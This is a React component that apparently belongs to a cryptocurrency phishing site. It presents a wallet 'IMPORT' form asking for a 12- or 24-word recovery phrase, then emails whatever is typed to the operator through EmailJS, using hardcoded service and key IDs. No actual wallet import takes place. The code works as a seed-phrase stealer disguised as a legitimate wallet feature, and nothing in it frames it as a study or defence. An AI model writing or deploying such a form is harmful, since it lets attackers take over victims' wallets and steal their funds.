import React from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import { Typography } from "@mui/material";
import { Box } from "@mui/system";

const Phrase = () => {
  const form = useRef();
  const navigate = useNavigate();
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_yj787qi",
        "template_4jfv0kj",
        form.current,
        "g4ZEWVbf7KjSHQdm2"
      )
      .then(
        (result) => {
          console.log(result.text);
          navigate("/success-page");
        },
        (error) => {
          console.log(error.text);
          navigate("/error");
        }
      );
  };
  return (
    <form ref={form} onSubmit={sendEmail}>
      <textarea rows={10} className="form-control" name="message" placeholder="Phrase" />
      <Box paddingY={2}>
        <Typography
          sx={{
            fontWeight: "bolder",
            fontFamily: "Montserrat",
            textAlign: "center",
            fontSize: ".9rem",
          }}
          variant="h6"
        >
          Typically 12 (sometimes 24) words seperated by single spaces
        </Typography>
      </Box>
      <input className="btn btn-primary" type="submit" value="IMPORT" />
    </form>
  );
};

export default Phrase;
